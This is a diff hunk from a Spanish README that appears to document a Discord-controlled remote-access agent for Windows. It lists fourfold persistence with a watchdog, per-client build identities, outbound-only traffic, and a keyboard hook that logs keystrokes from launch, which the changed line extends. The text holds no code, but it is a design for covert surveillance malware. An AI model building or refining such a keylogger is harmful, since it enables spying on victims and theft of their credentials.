@@ -78,7 +78,7 @@ Se ejecutan en el canal de sesión del equipo. El panel publica además quince b
 - **Cuatro capas de persistencia**: RunKey, tarea de logon, tarea de arranque como SYSTEM y servicio. Un watchdog revisa cada minuto y relanza si falta.
 - **Reconexión** con espera creciente, más watchdog de red para la sesión zombi.
 - **Identidad propia** por cliente: nombre, servicio, tareas, registro y carpeta salen de `internal/config` y se fijan al compilar con `-ldflags -X`.
-- **Keylogger activo desde el arranque**: el hook `WH_KEYBOARD_LL` se monta al abrir el binario, sin comando. Cada ventana abre su propio bloque con hora UTC, proceso y título; el dump sale como `.txt` con las teclas especiales inline (`[ENTER]`, `[CTRL+C]`, `[VK:0xNN]`).
+- **Keylogger activo desde el arranque**: el hook `WH_KEYBOARD_LL` se monta al abrir el binario, sin comando. Cada ventana abre su propio bloque con hora UTC, proceso y título; el dump sale como `.txt` con las teclas especiales inline (`[ENTER]`, `[RIGHT]`, `[CTRL+RIGHT]`, `[VK:0xNN]`). Una tecla mantenida se funde en una sola marca con contador: `[RIGHT]x16`.
 - **Sin puertos abiertos**: todo sale hacia el gateway y el webhook.
 - **Una aplicación de Discord por cliente**: dos agentes con el mismo token se expulsan.
 
